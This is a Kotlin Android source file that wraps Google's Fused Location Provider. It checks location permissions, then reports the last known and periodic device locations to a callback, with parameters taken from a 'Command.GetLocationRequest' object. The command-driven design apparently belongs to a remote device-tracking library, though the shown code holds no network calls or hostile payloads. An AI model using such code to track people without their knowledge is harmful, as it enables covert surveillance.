package com.hawkshaw.library.features.location

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Looper
import android.util.Log // Added for Android logging
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.logger.Logger
import com.google.android.gms.common.ConnectionResult
import com.google.android.gms.common.GoogleApiAvailability

/**
 * Wrapper for the Fused Location Provider
 *
 * This class manages location updates from the Google Play Services Fused Location Provider
 */
class FusedLocation(
    private val context: Context,
    private val onLocationReceived: (Location) -> Unit
) {
    companion object {
        private const val TAG = "FusedLocation" // Existing TAG
    }
    
    // Lazy initialization of the Fused Location Provider Client
    private val fusedClient: FusedLocationProviderClient by lazy {
        Log.d(TAG, "[DEBUG] Initializing FusedLocationProviderClient.")
        LocationServices.getFusedLocationProviderClient(context)
    }
    
    // Callback for location updates
    private var locationCallback: LocationCallback? = null
    
    init {
        Log.d(TAG, "[DEBUG] FusedLocation instance created.")
    }

    /**
     * Check if location permissions are granted
     */
    private fun hasLocationPermission(): Boolean {
        val fineLocationGranted = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val coarseLocationGranted = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val hasPermission = fineLocationGranted || coarseLocationGranted
        Log.d(TAG, "[DEBUG] hasLocationPermission called. Fine: $fineLocationGranted, Coarse: $coarseLocationGranted, HasPermission: $hasPermission")
        return hasPermission
    }
    
    /**
     * Checks if location services are available and requests location updates
     * 
     * @param lr The location request parameters
     */
    fun checkAndRequestLocationUpdates(lr: Command.GetLocationRequest) {
        Log.d(TAG, "[DEBUG] checkAndRequestLocationUpdates called with request: $lr")
        if (!hasLocationPermission()) {
            // Existing Logger.e is good.
            Log.e(TAG, "[DEBUG] Location permission not granted in checkAndRequestLocationUpdates.")
            Logger.e(TAG, "Location permission not granted", b = false, i = 12, nothing = null)
            return
        }
        
        // Check if Google Play Services are available
        val availability = GoogleApiAvailability.getInstance().isGooglePlayServicesAvailable(context)
        Log.d(TAG, "[DEBUG] Google Play Services availability: $availability (SUCCESS is ${ConnectionResult.SUCCESS})")
        if (availability != ConnectionResult.SUCCESS) {
            // FIX 1: Changed Logger.log to Logger.d and added required parameters (false, 4, null)
            Log.e(TAG, "[DEBUG] Google Play Services not available. Code: $availability")
            Logger.d(TAG, "Not available, google services are not available, $availability", false, 4, null)
            return
        }
        
        // Push last known location and request updates
        Log.d(TAG, "[DEBUG] Calling pushLastKnownLocation().")
        pushLastKnownLocation()
        Log.d(TAG, "[DEBUG] Calling requestLocationUpdates() with request: $lr")
        requestLocationUpdates(lr)
    }
    
    /**
     * Requests location updates using the parameters from the request
     * 
     * @param locationRequest The location request parameters
     */
    private fun requestLocationUpdates(locationRequest: Command.GetLocationRequest) {
        Log.d(TAG, "[DEBUG] requestLocationUpdates called with locationRequest: $locationRequest")
        try {
            val priority = convertPriority(locationRequest.priority)
            val request = LocationRequest.Builder(
                locationRequest.interval
            ).apply {
                setPriority(priority)
                setMinUpdateIntervalMillis(locationRequest.fastestInterval)
                setMinUpdateDistanceMeters(locationRequest.smallestDisplacement)
            }.build()
            Log.d(TAG, "[DEBUG] Created LocationRequest: interval=${request.intervalMillis}, priority=${request.priority}, minInterval=${request.minUpdateIntervalMillis}, minDistance=${request.minUpdateDistanceMeters}")

            locationCallback = object : LocationCallback() {
                override fun onLocationResult(result: LocationResult) {
                    Log.d(TAG, "[DEBUG] onLocationResult received. Result: $result")
                    result.lastLocation?.let { location ->
                        Log.d(TAG, "[DEBUG] LocationCallback: LocationReceived: $location")
                        // Existing Logger.d is good.
                        Logger.d(TAG, "LocationReceived: $location", false, 4, null)
                        onLocationReceived(location)
                    } ?: Log.d(TAG, "[DEBUG] onLocationResult: lastLocation is null.")
                }
            }
            Log.d(TAG, "[DEBUG] LocationCallback created.")

            fusedClient.requestLocationUpdates(
                request,
                locationCallback!!,
                Looper.getMainLooper()
            )
            Log.d(TAG, "[DEBUG] fusedClient.requestLocationUpdates called successfully.")
            // Existing Logger.d is good.
            Logger.d(TAG, "Requesting location updates with interval: ${locationRequest.interval} ms", false, 4, null)
        } catch (e: SecurityException) {
            Log.e(TAG, "[DEBUG] Security exception in requestLocationUpdates: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(
                TAG,
                "Security exception while requesting location updates",
                e,
                false,
                12,
                null
            )
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error in requestLocationUpdates: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "Error requesting location updates", e, false, 12, null)
        }
    }
    
    /**
     * Converts our priority enum to Google Play Services Priority
     */
    private fun convertPriority(priority: Command.GetLocationRequest.Priority): Int {
        Log.d(TAG, "[DEBUG] convertPriority called with priority: $priority")
        val googlePriority = when (priority) {
            Command.GetLocationRequest.Priority.PRIORITY_HIGH_ACCURACY -> Priority.PRIORITY_HIGH_ACCURACY
            Command.GetLocationRequest.Priority.PRIORITY_BALANCED_POWER_ACCURACY -> Priority.PRIORITY_BALANCED_POWER_ACCURACY
            Command.GetLocationRequest.Priority.PRIORITY_LOW_POWER -> Priority.PRIORITY_LOW_POWER
            Command.GetLocationRequest.Priority.PRIORITY_PASSIVE -> Priority.PRIORITY_PASSIVE
        }
        Log.d(TAG, "[DEBUG] Converted priority $priority to Google Play Services priority: $googlePriority")
        return googlePriority
    }
    
    /**
     * Stops location updates
     */
    fun stopLocationUpdates() {
        Log.d(TAG, "[DEBUG] stopLocationUpdates called.")
        // Existing Logger.d is good.
        Logger.d(TAG, "Stopping location updates", false, 4, null)
        try {
            locationCallback?.let { callback ->
                Log.d(TAG, "[DEBUG] Removing location updates with callback.")
                fusedClient.removeLocationUpdates(callback)
                locationCallback = null
                Log.d(TAG, "[DEBUG] Location updates removed successfully, callback set to null.")
            } ?: Log.d(TAG, "[DEBUG] locationCallback is null, no updates to remove.")
        } catch (e: SecurityException) {
            Log.e(TAG, "[DEBUG] Security exception in stopLocationUpdates: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "Security exception while stopping location updates", e, false, 12, null)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error in stopLocationUpdates: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "Error stopping location updates", e, false, 12, null)
        }
    }
    
    /**
     * Pushes the last known location to the listener
     */
    private fun pushLastKnownLocation() {
        Log.d(TAG, "[DEBUG] pushLastKnownLocation called.")
        if (!hasLocationPermission()) {
            // Existing Logger.e is good.
            Log.e(TAG, "[DEBUG] Location permission not granted in pushLastKnownLocation.")
            Logger.e(TAG, "Location permission not granted", b = false, i = 12, nothing = null)
            return
        }
        
        try {
            Log.d(TAG, "[DEBUG] Requesting last location from fusedClient.")
            fusedClient.lastLocation
                .addOnSuccessListener { location ->
                    if (location != null) {
                        Log.d(TAG, "[DEBUG] LastKnownLocation SUCCESS: $location")
                        // Existing Logger.d is good.
                        Logger.d(TAG, "LastKnownLocationReceived: $location", false, 4, null)
                        onLocationReceived(location)
                    } else {
                        Log.d(TAG, "[DEBUG] LastKnownLocation SUCCESS: but location is null.")
                    }
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "[DEBUG] LastKnownLocation FAILURE: ${exception.message}", exception)
                    // Existing Logger.e is good.
                    Logger.e(
                        TAG,
                        "PushLastKnownLocation: ${exception.message}",
                        exception,
                        false,
                        12,
                        null
                    )
                }
        } catch (e: SecurityException) {
            Log.e(TAG, "[DEBUG] Security exception in pushLastKnownLocation: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "Security exception while getting last location", e, false, 12, null)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error in pushLastKnownLocation: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "Error getting last location", e, false, 12, null)
        }
    }
}
